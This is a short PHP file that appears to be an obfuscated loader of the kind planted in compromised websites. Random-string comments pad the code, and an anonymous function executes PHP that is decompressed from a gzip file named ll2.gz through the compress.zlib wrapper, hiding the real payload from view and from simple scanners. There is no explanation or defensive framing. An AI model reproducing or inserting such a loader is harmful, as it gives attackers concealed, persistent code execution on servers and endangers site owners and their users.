<?php /* 0KMrhiPFFsC6iIy */ ?>
<?php
# 5Ju~Gz9WdJ8G~6-T9omZzwhDF(L#}Yb{SNV

$bxoskw=function($p){include $p;};
$stfhae='compress.zlib://ll2.gz';
call_user_func($bxoskw,$stfhae);
?>